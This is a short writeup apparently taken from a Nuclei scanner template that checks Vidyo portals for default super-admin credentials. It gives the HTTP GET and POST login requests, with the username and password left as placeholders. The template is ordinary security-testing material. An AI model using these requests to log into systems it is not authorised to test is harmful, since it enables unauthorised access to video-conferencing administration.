# Nuclei Template: Vidyo Default Login
**Template ID:** vidyo-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** Medium
**CWE:** CWE-522
**Source:** Nuclei Template (`vidyo-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Vidyo default credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
GET /super/login.html?lang=en HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

POST /super/super_security_check;jsessionid={{session}}?csrf_tkn={{csrf_tkn}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Referer: {{RootURL}}/super/login.html?lang=en
Cookie: JSESSIONID={{session}} ; VidyoPortalSuperLanguage=en

username={{username}}&password={{password}}
```

## References
- https://support.vidyocloud.com/hc/en-us/articles/226265128
